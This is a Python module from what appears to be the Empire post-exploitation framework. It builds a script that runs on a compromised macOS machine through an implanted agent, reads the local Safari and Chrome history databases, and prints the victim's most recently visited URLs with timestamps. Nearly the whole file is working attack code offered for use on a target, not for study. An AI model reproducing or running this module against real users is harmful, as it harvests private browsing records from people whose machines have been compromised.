class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Browser Dump',
            'Author': ['@424f424f'],
            'Description': ("This module will dump browser history from Safari and Chrome."),
            'Background': False,
            'OutputExtension': "",
            'NeedsAdmin': False,
            'OpsecSafe': True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                "https://gist.github.com/dropmeaword/9372cbeb29e8390521c2"
            ]
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to keylog.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Number': {
                'Description'   :   'Number of URLs to return.',
                'Required'      :   True,
                'Value'         :   '3'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        number = self.options['Number']['Value']
        script = """
import sqlite3
import os
number = ''
class browser_dump():
    def __init__(self):
        try:
            print "[*] Dump Started!"
        except Exception as e:
            print e
    def func(self, number):
        print "Dumping safari..."
        print ""
        try:
            from os.path import expanduser
            home = expanduser("~") + '/Library/Safari/History.db'
            if os.path.isfile(home):
                conn = sqlite3.connect(home)
                cur = conn.cursor()
                cur.execute("SELECT datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as last_visited, hi.url, hv.title FROM history_visits hv, history_items hi WHERE hv.history_item = hi.id;")
                statment = cur.fetchall()
                number = %s * -1
                for item in statment[number:]:
                    print item
                conn.close()
        except Exception as e:
            print e
        print ""
        print "Dumping Chrome..."
        print ""
        try:
            from os.path import expanduser
            home = expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History'
            if os.path.isfile(home):
                conn = sqlite3.connect(home)
                cur = conn.cursor()
                cur.execute("SELECT datetime(last_visit_time/1000000-11644473600, \\"unixepoch\\") as last_visited, url, title, visit_count FROM urls;")
                statment = cur.fetchall()
                number = %s * -1
                for item in statment[number:]:
                    print item
                conn.close()
        except Exception as e:
            print "error"
            print e
s = browser_dump()
s.func(number)
""" % (number, number)
        return script